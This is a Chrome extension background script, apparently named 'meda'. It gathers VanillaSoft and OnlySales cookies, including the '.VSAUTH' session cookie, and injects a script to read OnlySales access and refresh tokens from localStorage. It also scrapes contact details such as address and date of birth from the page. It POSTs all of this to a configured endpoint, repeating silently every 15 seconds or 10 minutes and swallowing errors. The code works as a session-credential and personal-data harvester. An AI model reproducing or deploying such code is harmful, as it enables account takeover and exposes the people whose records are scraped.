const TARGETS = {
  vanillasoft: {
    label: "VanillaSoft",
    domains: ["s2.vanillasoft.net", "vanillasoft.net"],
  },
  onlysales: {
    label: "OnlySales",
    domains: ["app.onlysales.io", "onlysales.io"],
  },
};

async function collectCookies(targetKey) {
  const target = TARGETS[targetKey];
  if (!target) {
    throw new Error(`Unknown target ${targetKey}`);
  }
  const jar = new Map();
  for (const domain of target.domains) {
    const cookies = await chrome.cookies.getAll({ domain });
    cookies.forEach((cookie) => {
      if (!cookie || !cookie.name) return;
      jar.set(cookie.name, cookie.value || "");
    });
    // Also try url-based lookup to catch hostOnly/secure cookies like .VSAUTH
    try {
      const url = `https://${domain}/`;
      const urlCookies = await chrome.cookies.getAll({ url });
      urlCookies.forEach((cookie) => {
        if (!cookie || !cookie.name) return;
        jar.set(cookie.name, cookie.value || "");
      });
    } catch (err) {
      // ignore url lookup errors
    }
  }
  // Fallback: direct name lookups for VS and .VSAUTH across all domains.
  if (targetKey === "vanillasoft") {
    try {
      const vsList = await chrome.cookies.getAll({ name: "VS" });
      vsList.forEach((c) => jar.set("VS", c.value || ""));
      const vsauthList = await chrome.cookies.getAll({ name: ".VSAUTH" });
      vsauthList.forEach((c) => jar.set(".VSAUTH", c.value || ""));
    } catch (err) {
      // ignore lookup errors
    }
  }
  const cookieHeader = Array.from(jar.entries())
    .map(([name, value]) => `${name}=${value}`)
    .join("; ");
  return { cookieHeader, count: jar.size };
}

async function collectOnlySalesTokens(tabId) {
  if (!tabId) return {};
  try {
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const grab = (key) => window.localStorage.getItem(key);
        return {
          accessToken: grab("accessToken"),
          refreshToken: grab("refreshToken"),
          userData: grab("userData"),
        };
      },
    });
    return result || {};
  } catch (err) {
    return { error: err.message };
  }
}

async function collectOnlySalesContact(tabId) {
  if (!tabId) return {};
  try {
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const labelMap = {
          "first name": "first_name",
          "last name": "last_name",
          "email": "email",
          "phone number": "phone",
          "phone": "phone",
          "address": "address",
          "city": "city",
          "state": "state",
          "zip code": "zip",
          "postal code": "zip",
          "date of birth": "dob",
          "dob": "dob",
          "time zone": "timezone",
          "timezone": "timezone",
        };
        const result = {};
        const seen = {};
        document.querySelectorAll("label").forEach((label) => {
          const text = (label.innerText || "").trim().toLowerCase();
          const key = labelMap[text];
          if (!key) return;
          const container = label.parentElement;
          let input = container && container.querySelector("input, textarea");
          if (!input && label.nextElementSibling) {
            input = label.nextElementSibling.querySelector
              ? label.nextElementSibling.querySelector("input, textarea")
              : null;
          }
          const candidate = input && (input.value || input.placeholder || input.innerText || "").trim();
          if (candidate && !seen[key]) {
            result[key] = candidate;
            seen[key] = true;
          }
        });
        return result;
      },
    });
    return result || {};
  } catch (err) {
    return { error: err.message };
  }
}

async function getStoredEndpointAndToken() {
  const { medaCookieEndpoint, medaCookieToken } = await chrome.storage.sync.get([
    "medaCookieEndpoint",
    "medaCookieToken",
  ]);
  return { endpoint: medaCookieEndpoint, token: medaCookieToken };
}

async function pushPayload(target, tabId) {
  const { endpoint, token } = await getStoredEndpointAndToken();
  if (!endpoint) {
    return { ok: false, error: "No endpoint configured" };
  }
  const payload = await collectCookies(target);
  let tokens = {};
  let contact = {};
  if (target === "onlysales") {
    tokens = await collectOnlySalesTokens(tabId);
    contact = await collectOnlySalesContact(tabId);
  }
  const extraHeaders = { "Content-Type": "application/json" };
  if (token) extraHeaders["X-Meda-Token"] = token;
  const response = await fetch(endpoint, {
    method: "POST",
    headers: extraHeaders,
    credentials: "include",
    body: JSON.stringify({
      target,
      cookies: payload.cookieHeader,
      access_token: tokens?.accessToken || tokens?.access_token,
      refresh_token: tokens?.refreshToken || tokens?.refresh_token,
      user_data:
        contact && Object.keys(contact).length
          ? JSON.stringify(contact)
          : tokens?.userData || tokens?.user_data || null,
      generatedAt: new Date().toISOString(),
    }),
  });
  return {
    ok: response.ok,
    status: response.status,
    tokens,
    contact,
    count: payload.count,
  };
}

let autoSyncInFlight = false;

function scheduleAlarms() {
  if (!chrome.alarms || !chrome.alarms.create) {
    // Fallback: simple intervals if alarms are unavailable
    setInterval(() => handleAutoSync("onlysales"), 15000);
    setInterval(() => handleAutoSync("vanillasoft"), 10 * 60 * 1000);
    return;
  }
  chrome.alarms.create("meda-autosync", { periodInMinutes: 0.25 }); // ~15 seconds
  chrome.alarms.create("meda-autosync-vanillasoft", { periodInMinutes: 10 }); // every 10 minutes
}

async function handleAutoSync(targetName) {
  if (autoSyncInFlight) return;
  autoSyncInFlight = true;
  try {
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      const tab = tabs?.[0];
      if (!tab || !tab.url) {
        autoSyncInFlight = false;
        return;
      }
      const url = new URL(tab.url);
      const isOnlySales = url.hostname.includes("onlysales.io") && url.pathname.startsWith("/conversations");
      const isVanilla = url.hostname.includes("vanillasoft.net");
      if (targetName === "onlysales" && !isOnlySales) {
        autoSyncInFlight = false;
        return;
      }
      if (targetName === "vanillasoft" && !isVanilla) {
        autoSyncInFlight = false;
        return;
      }
      try {
        await pushPayload(targetName, tab.id);
      } catch (err) {
        // ignore autosync errors
      } finally {
        autoSyncInFlight = false;
      }
    });
  } catch (err) {
    autoSyncInFlight = false;
  }
}

if (chrome.alarms && chrome.alarms.onAlarm) {
  chrome.alarms.onAlarm.addListener((alarm) => {
    const isOnlySalesAlarm = alarm.name === "meda-autosync";
    const isVanillaAlarm = alarm.name === "meda-autosync-vanillasoft";
    if (!isOnlySalesAlarm && !isVanillaAlarm) return;
    const target = isOnlySalesAlarm ? "onlysales" : "vanillasoft";
    handleAutoSync(target);
  });
}

scheduleAlarms();

chrome.runtime.onMessage.addListener((request, _sender, sendResponse) => {
  if (request?.type === "FETCH_COOKIES") {
    collectCookies(request.target)
      .then(async (payload) => {
        if (payload.count === 0) {
          throw new Error("No cookies found for this target");
        }
        if (request.target === "onlysales") {
          const tokens = await collectOnlySalesTokens(request.tabId);
          const contact = await collectOnlySalesContact(request.tabId);
          return { ...payload, onlysalesTokens: tokens, onlysalesContact: contact };
        }
        return payload;
      })
      .then((payload) => sendResponse({ ok: true, ...payload }))
      .catch((error) => sendResponse({ ok: false, error: error.message || "Cookie fetch failed" }));
    return true;
  }
  if (request?.type === "PUSH_COOKIES") {
    const { target, endpoint, headers, tabId, overrides } = request;
    collectCookies(target)
      .then(async (payload) => {
        if (payload.count === 0) {
          throw new Error("No cookies found for this target");
        }
        let tokens = {};
        let contact = {};
        if (target === "onlysales") {
          tokens = await collectOnlySalesTokens(tabId);
          contact = await collectOnlySalesContact(tabId);
        }
        if (target === "vanillasoft" && overrides) {
          const vs = (overrides.vs || "").trim();
          const vsauth = (overrides.vsauth || "").trim();
          if (vs && vsauth) {
            payload.cookieHeader = `VS=${vs}; .VSAUTH=${vsauth}`;
            payload.count = payload.cookieHeader.split(";").length;
          }
        }
        if (!endpoint) {
          return { ok: true, ...payload, tokens, contact };
        }
        const response = await fetch(endpoint, {
          method: headers?.method || "POST",
          headers: headers?.extra || { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({
            target,
            cookies: payload.cookieHeader,
            access_token: tokens?.accessToken || tokens?.access_token,
            refresh_token: tokens?.refreshToken || tokens?.refresh_token,
            user_data: contact && Object.keys(contact).length
              ? JSON.stringify(contact)
              : (tokens?.userData || tokens?.user_data || null),
            generatedAt: new Date().toISOString(),
          }),
        });
        return { ok: response.ok, status: response.status, ...payload, tokens, contact };
      })
      .then((data) => sendResponse(data))
      .catch((error) => sendResponse({ ok: false, error: error.message }));
    return true;
  }
  return false;
});
